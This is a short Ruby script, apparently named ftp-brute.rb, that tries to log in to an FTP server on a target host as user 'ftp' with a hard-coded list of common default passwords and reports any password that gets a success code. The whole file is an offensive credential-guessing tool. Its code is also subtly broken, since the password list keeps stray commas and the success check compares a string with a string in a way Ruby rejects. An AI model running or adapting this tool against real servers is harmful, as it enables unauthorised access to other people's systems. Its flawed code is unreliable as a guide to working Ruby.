require 'socket'

def connect(host, username, pass)
  Socket.tcp(host, 21) do |s|
    s.recvfrom 1024

    s.sendmsg "USER #{username}\r\n"
    s.recvfrom 1024

    s.sendmsg "PASS #{pass}\r\n"
    data, _ = s.recvfrom 3 #only care about response code

    s.sendmsg "QUIT\r\n"
    s.close

    return data
  end
end

def usage
  puts 'ruby ftp-brute.rb <target>'
  exit -1
end

usage() if ARGV.length < 1

target = ARGV[0]

name = 'ftp'
passwords = %w(test, password, backup, 12345, root, administrator, admin, ftp)

passwords.each do |pw|
  attempt = connect(target, name, pw)

  print "[*] password found: #{pw}" if attempt =~ '230'
end